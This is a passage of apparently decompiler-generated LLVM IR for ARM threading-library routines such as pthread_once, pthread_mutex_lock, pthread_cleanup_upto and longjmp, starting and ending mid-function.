  br i1 %tmp, label %dec_label_pc_21b50, label %dec_label_pc_21a80

dec_label_pc_21a80:                               ; preds = %entry
  %v1_21a80 = add i32 %arg1, 12
  %v2_21a80 = inttoptr i32 %v1_21a80 to i32*
  %v3_21a80 = load i32, i32* %v2_21a80, align 4
  %tmp7 = icmp ult i32 %v3_21a80, 4
  br i1 %tmp7, label %bb, label %dec_label_pc_21b50

bb:                                               ; preds = %dec_label_pc_21a80
  %v7_21a88 = mul i32 %v3_21a80, 4
  %v8_21a88 = add i32 %v7_21a88, ptrtoint (i32* @global_var_21a90.1498 to i32)
  call void @__pseudo_branch(i32 %v8_21a88)
  br label %dec_label_pc_21b50

dec_label_pc_21b50:                               ; preds = %bb, %dec_label_pc_21a80, %entry
  ret i32 22

; uselistorder directives
  uselistorder i32 %v3_21a80, { 1, 0 }
}

define i32 @pthread_mutex_lock(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_21b60 = load i32, i32* @r4, align 4
  store i32 %v3_21b60, i32* %stack_var_-12, align 4
  %v1_21b64 = add i32 %arg1, 12
  %v2_21b64 = inttoptr i32 %v1_21b64 to i32*
  %v3_21b64 = load i32, i32* %v2_21b64, align 4
  %v7_21b70 = icmp eq i32 %v3_21b64, 3
  store i1 %v7_21b70, i1* @cpsr_z, align 1
  %tmp = icmp ult i32 %v3_21b64, 4
  br i1 %tmp, label %bb, label %dec_label_pc_21b8c

bb:                                               ; preds = %entry
  %v7_21b74 = mul i32 %v3_21b64, 4
  %v8_21b74 = add i32 %v7_21b74, ptrtoint (i32* @global_var_21b7c.1499 to i32)
  call void @__pseudo_branch(i32 %v8_21b74)
  %v2_21c28.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_21b8c

dec_label_pc_21b8c:                               ; preds = %bb, %entry
  %v2_21c28 = phi i32 [ %v2_21c28.pre, %bb ], [ %v3_21b60, %entry ]
  store i32 %v2_21c28, i32* @r4, align 4
  ret i32 22

; uselistorder directives
  uselistorder i32 %v3_21b64, { 1, 0, 2 }
}

define i32 @__pthread_once_fork_prepare(i32 %arg1) local_unnamed_addr {
entry:
  %v1_21c40 = call i32 @pthread_mutex_lock(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38692))
  %v0_21c44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_21c44, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  ret i32 %v1_21c40

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @pthread_once(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v3_21c4c = load i32, i32* @r4, align 4
  store i32 %v3_21c4c, i32* %stack_var_-28, align 4
  %v2_21c50 = load i32, i32* %arg1, align 4
  %v7_21c58 = icmp eq i32 %v2_21c50, 2
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  br i1 %v7_21c58, label %dec_label_pc_21dac, label %dec_label_pc_21c74

dec_label_pc_21c74:                               ; preds = %entry
  store i32 138380, i32* @lr, align 4
  call void @__pseudo_branch(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -142896))
  %v0_21c8c = load i32, i32* @r7, align 4
  %v1_21c8c = inttoptr i32 %v0_21c8c to i32*
  %v2_21c8c = load i32, i32* %v1_21c8c, align 4
  %v1_21c90 = urem i32 %v2_21c8c, 4
  %v7_21c94 = icmp eq i32 %v1_21c90, 1
  br i1 %v7_21c94, label %dec_label_pc_21c9c, label %dec_label_pc_21cc0

dec_label_pc_21c9c:                               ; preds = %dec_label_pc_21c74
  %v0_21ca0 = load i32, i32* @r6, align 4
  %v2_21ca0 = add i32 %v0_21ca0, 38728
  %v3_21ca0 = inttoptr i32 %v2_21ca0 to i32*
  %v4_21ca0 = load i32, i32* %v3_21ca0, align 4
  %v1_21ca4 = and i32 %v2_21c8c, -4
  %v9_21ca8 = icmp eq i32 %v1_21ca4, %v4_21ca0
  br i1 %v9_21ca8, label %dec_label_pc_21cc0, label %bb

bb:                                               ; preds = %dec_label_pc_21c9c
  store i32 0, i32* %v1_21c8c, align 4
  %v0_21cd017.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_21cc0

dec_label_pc_21cb8:                               ; preds = %dec_label_pc_21cc0, %dec_label_pc_21cb8
  %v0_21cdc25 = phi i32 [ %v0_21cdc.pre, %dec_label_pc_21cb8 ], [ %v2_21cc4, %dec_label_pc_21cc0 ]
  %v0_21ce024 = phi i32 [ %v0_21ce0.pre, %dec_label_pc_21cb8 ], [ %v2_21ccc, %dec_label_pc_21cc0 ]
  %v2_21cb8 = call i32 @__GI_pthread_cond_wait(i32 %v0_21cdc25, i32 %v0_21ce024)
  %v0_21cdc.pre = load i32, i32* @r5, align 4
  %v0_21ce0.pre = load i32, i32* @r4, align 4
  %v0_21cd0 = load i32, i32* @r7, align 4
  %v1_21cd0 = inttoptr i32 %v0_21cd0 to i32*
  %v2_21cd0 = load i32, i32* %v1_21cd0, align 4
  store i32 %v2_21cd0, i32* @r8, align 4
  %v1_21cd4 = urem i32 %v2_21cd0, 4
  %v7_21cd8 = icmp eq i32 %v1_21cd4, 1
  br i1 %v7_21cd8, label %dec_label_pc_21cb8, label %dec_label_pc_21ce8

dec_label_pc_21cc0:                               ; preds = %dec_label_pc_21c9c, %bb, %dec_label_pc_21c74
  %v0_21cd017 = phi i32 [ %v0_21c8c, %dec_label_pc_21c9c ], [ %v0_21cd017.pre, %bb ], [ %v0_21c8c, %dec_label_pc_21c74 ]
  %v0_21cc4 = load i32, i32* @r6, align 4
  %v2_21cc4 = add i32 %v0_21cc4, 38716
  store i32 %v2_21cc4, i32* @r5, align 4
  %v2_21ccc = add i32 %v0_21cc4, 38692
  store i32 %v2_21ccc, i32* @r4, align 4
  %v1_21cd018 = inttoptr i32 %v0_21cd017 to i32*
  %v2_21cd019 = load i32, i32* %v1_21cd018, align 4
  store i32 %v2_21cd019, i32* @r8, align 4
  %v1_21cd420 = urem i32 %v2_21cd019, 4
  %v7_21cd823 = icmp eq i32 %v1_21cd420, 1
  br i1 %v7_21cd823, label %dec_label_pc_21cb8, label %dec_label_pc_21ce8

dec_label_pc_21ce8:                               ; preds = %dec_label_pc_21cb8, %dec_label_pc_21cc0
  %v1_21cd0.lcssa = phi i32* [ %v1_21cd018, %dec_label_pc_21cc0 ], [ %v1_21cd0, %dec_label_pc_21cb8 ]
  %v2_21cd0.lcssa = phi i32 [ %v2_21cd019, %dec_label_pc_21cc0 ], [ %v2_21cd0, %dec_label_pc_21cb8 ]
  %v2_21ce8 = icmp eq i32 %v2_21cd0.lcssa, 0
  br i1 %v2_21ce8, label %dec_label_pc_21cf4, label %dec_label_pc_21d84

dec_label_pc_21cf4:                               ; preds = %dec_label_pc_21ce8
  %v0_21cf8 = load i32, i32* @r6, align 4
  %v2_21cf8 = add i32 %v0_21cf8, 38728
  %v3_21cf8 = inttoptr i32 %v2_21cf8 to i32*
  %v4_21cf8 = load i32, i32* %v3_21cf8, align 4
  store i32 38692, i32* %r4.global-to-local, align 4
  %v1_21d00 = or i32 %v4_21cf8, 1
  store i32 %v1_21d00, i32* %v1_21cd0.lcssa, align 4
  %v0_21d0c = load i32, i32* @r6, align 4
  %v1_21d0c = load i32, i32* %r4.global-to-local, align 4
  %v2_21d0c = add i32 %v1_21d0c, %v0_21d0c
  store i32 %v2_21d0c, i32* %r4.global-to-local, align 4
  %v2_21d10 = add i32 %v0_21d0c, -143384
  call void @__pseudo_branch(i32 %v2_21d10)
  %v0_21d28 = load i32, i32* @r6, align 4
  %v2_21d38 = add i32 %v0_21d28, 216
  %v3_21d38 = inttoptr i32 %v2_21d38 to i32*
  %v4_21d38 = load i32, i32* %v3_21d38, align 4
  call void @__pseudo_branch(i32 %v4_21d38)
  call void @__pseudo_branch(i32 %arg2)
  %v0_21d58 = load i32, i32* @r6, align 4
  %v2_21d58 = add i32 %v0_21d58, 60
  %v3_21d58 = inttoptr i32 %v2_21d58 to i32*
  %v4_21d58 = load i32, i32* %v3_21d58, align 4
  call void @__pseudo_branch(i32 %v4_21d58)
  %v0_21d6c = load i32, i32* @r6, align 4
  %v2_21d6c = add i32 %v0_21d6c, -142896
  call void @__pseudo_branch(i32 %v2_21d6c)
  %v1_21d7c = load i32, i32* @r7, align 4
  %v2_21d7c = inttoptr i32 %v1_21d7c to i32*
  store i32 2, i32* %v2_21d7c, align 4
  br label %dec_label_pc_21d84

dec_label_pc_21d84:                               ; preds = %dec_label_pc_21ce8, %dec_label_pc_21cf4
  %storemerge = phi i32 [ 1, %dec_label_pc_21cf4 ], [ 0, %dec_label_pc_21ce8 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v0_21d8c = load i32, i32* @r6, align 4
  %v2_21d90 = add i32 %v0_21d8c, -143384
  call void @__pseudo_branch(i32 %v2_21d90)
  %v2_21d9c = icmp eq i32 %storemerge, 0
  br i1 %v2_21d9c, label %.thread2, label %bb16

bb16:                                             ; preds = %dec_label_pc_21d84
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_21d84, %bb16
  %v1_21da8 = xor i1 %v2_21d9c, true
  call void @__pseudo_cond_branch(i1 %v1_21da8, i32 ptrtoint (i32* @global_var_20b20.1511 to i32))
  %v2_21db4.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_21dac

dec_label_pc_21dac:                               ; preds = %entry, %.thread2
  %v2_21db4 = phi i32 [ %v3_21c4c, %entry ], [ %v2_21db4.pre, %.thread2 ]
  store i32 %v2_21db4, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_21d0c, { 1, 0 }
  uselistorder i32 %v2_21cd019, { 1, 0, 2 }
  uselistorder i32 %v2_21ccc, { 1, 0 }
  uselistorder i32 %v2_21cc4, { 1, 0 }
  uselistorder i32 %v2_21cd0, { 1, 0, 2 }
  uselistorder i32 %v2_21c8c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32 38728, { 1, 2, 0 }
  uselistorder label %dec_label_pc_21dac, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_21d84, { 1, 0 }
  uselistorder label %dec_label_pc_21ce8, { 1, 0 }
  uselistorder label %dec_label_pc_21cc0, { 1, 0, 2 }
}

define i32 @pthread_once_cancelhandler(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38692), i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  call void @__pseudo_branch(i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -142896))
  %v1_21e10 = load i32, i32* @r6, align 4
  %v2_21e10 = inttoptr i32 %v1_21e10 to i32*
  store i32 0, i32* %v2_21e10, align 4
  %v0_21e1c = load i32, i32* @r4, align 4
  %v2_21e1c = add i32 %v0_21e1c, -143384
  store i32 138792, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_21e1c)
  %v0_21e2c = load i32, i32* @r4, align 4
  %v2_21e2c = add i32 %v0_21e2c, 38716
  %v1_21e30 = call i32 @pthread_cond_broadcast(i32 %v2_21e2c)
  ret i32 %v1_21e30

; uselistorder directives
  uselistorder i32 38716, { 1, 2, 0 }
  uselistorder i32 38692, { 1, 0, 2 }
}

define i32 @pthread_mutex_trylock(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %v1_21e54 = add i32 %arg1, 12
  %v2_21e54 = inttoptr i32 %v1_21e54 to i32*
  %v3_21e54 = load i32, i32* %v2_21e54, align 4
  %tmp = icmp ult i32 %v3_21e54, 4
  br i1 %tmp, label %bb, label %dec_label_pc_21e7c

bb:                                               ; preds = %entry
  %v7_21e64 = mul i32 %v3_21e54, 4
  %v8_21e64 = add i32 %v7_21e64, ptrtoint (i32* @global_var_21e6c.1517 to i32)
  call void @__pseudo_branch(i32 %v8_21e64)
  br label %dec_label_pc_21e7c

dec_label_pc_21e7c:                               ; preds = %bb, %entry
  ret i32 22

; uselistorder directives
  uselistorder i32 %v3_21e54, { 1, 0 }
}

define i32 @pthread_cleanup_upto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_21f28 = load i32, i32* @r4, align 4
  store i32 %v3_21f28, i32* %stack_var_-20, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r2.global-to-local, align 4
  %v4_21f34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 64) to i32*), align 4
  %v1_21f38 = inttoptr i32 %v4_21f34 to i32*
  %v2_21f38 = load i32, i32* %v1_21f38, align 4
  %v2_21f3c = ptrtoint i32* %stack_var_-24 to i32
  %v3_21f40 = icmp ult i32 %v2_21f3c, %v2_21f38
  store i32 %v2_21f3c, i32* %r6.global-to-local, align 4
  %v0_21f48 = load i32, i32* @r0, align 4
  store i32 %v0_21f48, i32* %r7.global-to-local, align 4
  br i1 %v3_21f40, label %dec_label_pc_21f54, label %dec_label_pc_21f80

dec_label_pc_21f54:                               ; preds = %entry
  %v4_21f58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 44) to i32*), align 4
  %v1_21f5c = inttoptr i32 %v4_21f58 to i32*
  %v2_21f5c = load i32, i32* %v1_21f5c, align 4
  %v3_21f60 = icmp ult i32 %v2_21f3c, %v2_21f5c
  br i1 %v3_21f60, label %dec_label_pc_21f88, label %dec_label_pc_21f68

dec_label_pc_21f68:                               ; preds = %dec_label_pc_21f54
  %v4_21f6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 204) to i32*), align 4
  %v1_21f70 = inttoptr i32 %v4_21f6c to i32*
  %v2_21f70 = load i32, i32* %v1_21f70, align 4
  %v3_21f74 = icmp ult i32 %v2_21f3c, %v2_21f70
  br i1 %v3_21f74, label %dec_label_pc_21f80, label %dec_label_pc_21f88

dec_label_pc_21f80:                               ; preds = %dec_label_pc_21f68, %entry
  %v1_21f80 = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 184), %entry ], [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120), %dec_label_pc_21f68 ]
  %v3_21f80 = inttoptr i32 %v1_21f80 to i32*
  %v4_21f80 = load i32, i32* %v3_21f80, align 4
  store i32 %v4_21f80, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_21fb8

dec_label_pc_21f88:                               ; preds = %dec_label_pc_21f68, %dec_label_pc_21f54
  %v4_21f8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 112) to i32*), align 4
  %v1_21f90 = inttoptr i32 %v4_21f8c to i32*
  %v2_21f90 = load i32, i32* %v1_21f90, align 4
  %v2_21f94 = icmp eq i32 %v2_21f90, 0
  br i1 %v2_21f94, label %dec_label_pc_21fa8, label %dec_label_pc_21f9c

dec_label_pc_21f9c:                               ; preds = %dec_label_pc_21f88
  %v0_21f9c = call i32 @__pthread_find_self()
  store i32 %v0_21f9c, i32* @r0, align 4
  store i32 %v0_21f9c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_21fb8

dec_label_pc_21fa8:                               ; preds = %dec_label_pc_21f88
  %v3_21fa8 = and i32 %v2_21f3c, -2097152
  %v4_21fa8 = xor i32 %v3_21fa8, -2097152
  %v1_21fb4 = sub i32 -352, %v4_21fa8
  store i32 %v1_21fb4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_21fb8

dec_label_pc_21fb8:                               ; preds = %dec_label_pc_21f9c, %dec_label_pc_21f80, %dec_label_pc_21fa8
  %v0_21fb8 = phi i32 [ %v0_21f9c, %dec_label_pc_21f9c ], [ %v4_21f80, %dec_label_pc_21f80 ], [ %v1_21fb4, %dec_label_pc_21fa8 ]
  %v1_21fb8 = add i32 %v0_21fb8, 60
  %storemerge.in2 = inttoptr i32 %v1_21fb8 to i32*
  %storemerge3 = load i32, i32* %storemerge.in2, align 4
  store i32 %storemerge3, i32* %r4.global-to-local, align 4
  %v2_21fe05 = icmp eq i32 %storemerge3, 0
  br i1 %v2_21fe05, label %dec_label_pc_21ff4, label %dec_label_pc_21fe8

dec_label_pc_21fc0:                               ; preds = %dec_label_pc_21fe8
  %v1_21fc0 = load i32, i32* %r6.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_21fc0, %v1_21fc0
  br i1 %tmp, label %dec_label_pc_21fcc, label %.dec_label_pc_21ff4_crit_edge

dec_label_pc_21fcc:                               ; preds = %dec_label_pc_21fc0
  %v1_21fcc = add i32 %v0_21fc0, 4
  %v2_21fcc = inttoptr i32 %v1_21fcc to i32*
  %v3_21fcc = load i32, i32* %v2_21fcc, align 4
  store i32 %v3_21fcc, i32* @r0, align 4
  %v1_21fd0 = inttoptr i32 %v0_21fc0 to i32*
  %v2_21fd0 = load i32, i32* %v1_21fd0, align 4
  call void @__pseudo_branch(i32 %v2_21fd0)
  %v0_21fdc = load i32, i32* %r4.global-to-local, align 4
  %v1_21fdc = add i32 %v0_21fdc, 12
  %storemerge.in = inttoptr i32 %v1_21fdc to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_21fe0 = icmp eq i32 %storemerge, 0
  br i1 %v2_21fe0, label %dec_label_pc_21ff4, label %dec_label_pc_21fe8

dec_label_pc_21fe8:                               ; preds = %dec_label_pc_21fb8, %dec_label_pc_21fcc
  %v0_21fc0 = phi i32 [ %storemerge, %dec_label_pc_21fcc ], [ %storemerge3, %dec_label_pc_21fb8 ]
  %v0_21fe8 = load i32, i32* %r7.global-to-local, align 4
  %v1_21fe8 = add i32 %v0_21fe8, 32
  %v2_21fe8 = inttoptr i32 %v1_21fe8 to i32*
  %v3_21fe8 = load i32, i32* %v2_21fe8, align 4
  %v3_21fec = icmp ult i32 %v0_21fc0, %v3_21fe8
  br i1 %v3_21fec, label %dec_label_pc_21fc0, label %dec_label_pc_21ff4

.dec_label_pc_21ff4_crit_edge:                    ; preds = %dec_label_pc_21fc0
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_21ff4

dec_label_pc_21ff4:                               ; preds = %dec_label_pc_21fe8, %dec_label_pc_21fcc, %.dec_label_pc_21ff4_crit_edge, %dec_label_pc_21fb8
  %v0_21ffc = phi i32 [ 0, %.dec_label_pc_21ff4_crit_edge ], [ 0, %dec_label_pc_21fb8 ], [ 0, %dec_label_pc_21fcc ], [ %v0_21fc0, %dec_label_pc_21fe8 ]
  %v0_21ff4 = load i32, i32* %r5.global-to-local, align 4
  %v1_21ff4 = add i32 %v0_21ff4, 84
  %v2_21ff4 = inttoptr i32 %v1_21ff4 to i32*
  %v3_21ff4 = load i32, i32* %v2_21ff4, align 4
  store i32 %v3_21ff4, i32* %r2.global-to-local, align 4
  %v2_21ff8 = icmp eq i32 %v3_21ff4, 0
  %v2_21ffc = add i32 %v0_21ff4, 60
  %v3_21ffc = inttoptr i32 %v2_21ffc to i32*
  store i32 %v0_21ffc, i32* %v3_21ffc, align 4
  br i1 %v2_21ff8, label %.thread1, label %dec_label_pc_22004

dec_label_pc_22004:                               ; preds = %dec_label_pc_21ff4
  %v0_22004 = load i32, i32* %r7.global-to-local, align 4
  %v1_22004 = add i32 %v0_22004, 32
  %v2_22004 = inttoptr i32 %v1_22004 to i32*
  %v3_22004 = load i32, i32* %v2_22004, align 4
  %v0_22008 = load i32, i32* %r2.global-to-local, align 4
  %v3_22008 = icmp ult i32 %v0_22008, %v3_22004
  br i1 %v3_22008, label %bb22, label %.thread1

bb22:                                             ; preds = %dec_label_pc_22004
  %v2_22010 = load i32, i32* %r5.global-to-local, align 4
  %v3_22010 = add i32 %v2_22010, 84
  %v4_22010 = inttoptr i32 %v3_22010 to i32*
  store i32 0, i32* %v4_22010, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_22004, %dec_label_pc_21ff4, %bb22
  %v2_22018 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_22018, i32* @r4, align 4
  %v1_2201c = load i32, i32* @r0, align 4
  ret i32 %v1_2201c

; uselistorder directives
  uselistorder i32 %v0_21fc0, { 1, 4, 0, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %.thread1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_21ff4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_21fe8, { 1, 0 }
  uselistorder label %dec_label_pc_21fb8, { 2, 0, 1 }
}

define i32 @function_22024(i16* %arg1) local_unnamed_addr {
dec_label_pc_22024:
  %v0_22024 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_22024, label %.thread, label %.thread4

.thread:                                          ; preds = %dec_label_pc_22024
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_22024
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_22044 = call i32 @pthread_cleanup_upto()
  %v0_22048 = load i32, i32* @r4, align 4
  %v0_2204c = load i32, i32* @r5, align 4
  %v2_22050 = call i32 @_longjmp(i32 %v0_22048, i32 %v0_2204c)
  ret i32 %v2_22050
}

define i32 @siglongjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_2205c = call i32 @pthread_cleanup_upto()
  %v0_22060 = load i32, i32* @r4, align 4
  %v0_22064 = load i32, i32* @r5, align 4
  %v2_22068 = call i32 @_longjmp(i32 %v0_22060, i32 %v0_22064)
  ret i32 %v2_22068

; uselistorder directives
  uselistorder i32 (i32, i32)* @_longjmp, { 1, 0 }
  uselistorder i32 ()* @pthread_cleanup_upto, { 1, 0 }
}

define i32 @_thread_self.12() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_22070 = load i32, i32* @lr, align 4
  store i32 %v0_22070, i32* %stack_var_-4, align 4
  %v4_2207c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 64) to i32*), align 4
  %v1_22080 = inttoptr i32 %v4_2207c to i32*
  %v2_22080 = load i32, i32* %v1_22080, align 4
  %v2_22084 = ptrtoint i32* %stack_var_-8 to i32
  %v3_22088 = icmp ult i32 %v2_22084, %v2_22080
  br i1 %v3_22088, label %dec_label_pc_22098, label %dec_label_pc_220c4

dec_label_pc_22098:                               ; preds = %entry
  %v4_2209c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 44) to i32*), align 4
  %v1_220a0 = inttoptr i32 %v4_2209c to i32*
  %v2_220a0 = load i32, i32* %v1_220a0, align 4
  %v3_220a4 = icmp ult i32 %v2_22084, %v2_220a0
  br i1 %v3_220a4, label %dec_label_pc_220cc, label %dec_label_pc_220ac

dec_label_pc_220ac:                               ; preds = %dec_label_pc_22098
  %v4_220b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 204) to i32*), align 4
  %v1_220b4 = inttoptr i32 %v4_220b0 to i32*
  %v2_220b4 = load i32, i32* %v1_220b4, align 4
  %v3_220b8 = icmp ult i32 %v2_22084, %v2_220b4
  br i1 %v3_220b8, label %dec_label_pc_220c4, label %dec_label_pc_220cc

dec_label_pc_220c4:                               ; preds = %dec_label_pc_220ac, %entry
  %v1_220c4 = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 184), %entry ], [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120), %dec_label_pc_220ac ]
  %v3_220c4 = inttoptr i32 %v1_220c4 to i32*
  %v4_220c4 = load i32, i32* %v3_220c4, align 4
  br label %dec_label_pc_220f8

dec_label_pc_220cc:                               ; preds = %dec_label_pc_220ac, %dec_label_pc_22098
  %v4_220d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 112) to i32*), align 4
  %v1_220d4 = inttoptr i32 %v4_220d0 to i32*
  %v2_220d4 = load i32, i32* %v1_220d4, align 4
  %v2_220d8 = icmp eq i32 %v2_220d4, 0
  br i1 %v2_220d8, label %dec_label_pc_220e8, label %dec_label_pc_220e0

dec_label_pc_220e0:                               ; preds = %dec_label_pc_220cc
  %v0_220e0 = call i32 @__pthread_find_self()
  %v2_220fc.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_220f8

dec_label_pc_220e8:                               ; preds = %dec_label_pc_220cc
  %v3_220e8 = and i32 %v2_22084, -2097152
  %v4_220e8 = xor i32 %v3_220e8, -2097152
  %v1_220f4 = sub i32 -352, %v4_220e8
  br label %dec_label_pc_220f8

dec_label_pc_220f8:                               ; preds = %dec_label_pc_220e0, %dec_label_pc_220c4, %dec_label_pc_220e8
  %v1_22100 = phi i32 [ %v0_220e0, %dec_label_pc_220e0 ], [ %v4_220c4, %dec_label_pc_220c4 ], [ %v1_220f4, %dec_label_pc_220e8 ]
  %v2_220fc = phi i32 [ %v2_220fc.pre, %dec_label_pc_220e0 ], [ %v0_22070, %dec_label_pc_220c4 ], [ %v0_22070, %dec_label_pc_220e8 ]
  store i32 %v2_220fc, i32* @lr, align 4
  ret i32 %v1_22100

; uselistorder directives
  uselistorder i32 ()* @__pthread_find_self, { 3, 8, 9, 2, 7, 1, 10, 6, 5, 4, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 120), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 204, { 1, 3, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_220f8, { 2, 0, 1 }
}

define i32 @function_22108(i16* %arg1) local_unnamed_addr {
dec_label_pc_22108:
  %v0_22108 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_22108, label %.thread, label %.thread4

.thread:                                          ; preds = %dec_label_pc_22108
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_22108
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_destroy_specifics(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %v3_22120 = load i32, i32* @r4, align 4
  %v6_22120 = load i32, i32* @r5, align 4
  %v9_22120 = load i32, i32* @r6, align 4
  %v12_22120 = load i32, i32* @r7, align 4
  %v27_22120 = load i32, i32* @lr, align 4
  %v0_22128 = call i32 @_thread_self.12()
  store i32 0, i32* @sl, align 4
  store i32 %v0_22128, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_221c0thread-pre-split

dec_label_pc_22158:                               ; preds = %dec_label_pc_221c0thread-pre-split, %dec_label_pc_221bc
  %v1_22170 = phi i32 [ %v1_221bc, %dec_label_pc_221bc ], [ %v1_221dc, %dec_label_pc_221c0thread-pre-split ]
  %v8_221d419 = phi i32 [ %v8_221d418, %dec_label_pc_221bc ], [ %v1_221dc, %dec_label_pc_221c0thread-pre-split ]
  %v0_22158 = load i32, i32* @r6, align 4
  %v4_22158 = mul i32 %v1_22170, 4
  %v5_22158 = add i32 %v0_22158, %v4_22158
  %v1_22160 = add i32 %v5_22158, 116
  %v2_22160 = inttoptr i32 %v1_22160 to i32*
  %v3_22160 = load i32, i32* %v2_22160, align 4
  %v2_22164 = icmp eq i32 %v3_22160, 0
  br i1 %v2_22164, label %dec_label_pc_221bc, label %dec_label_pc_221a8thread-pre-split

dec_label_pc_2217c:                               ; preds = %dec_label_pc_221a8
  %v2_221ac = add i32 %v2_22194, %v0_221ac
  %v4_221b4 = mul i32 %v2_221ac, 8
  %v0_2217c = load i32, i32* %sb.global-to-local, align 4
  %v1_2217c = add i32 %v0_2217c, 20
  %v2_2217c = inttoptr i32 %v1_2217c to i32*
  %v3_2217c = load i32, i32* %v2_2217c, align 4
  %v1_22180 = add i32 %v4_221b4, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 38736)
  %v2_22180 = inttoptr i32 %v1_22180 to i32*
  %v3_22180 = load i32, i32* %v2_22180, align 4
  %v4_22184 = mul i32 %v2_22194, 4
  %v5_22184 = add i32 %v3_2217c, %v4_22184
  %v6_22184 = inttoptr i32 %v5_22184 to i32*
  %v2_22188 = icmp eq i32 %v3_22180, 0
  br i1 %v2_22188, label %dec_label_pc_22194, label %bb

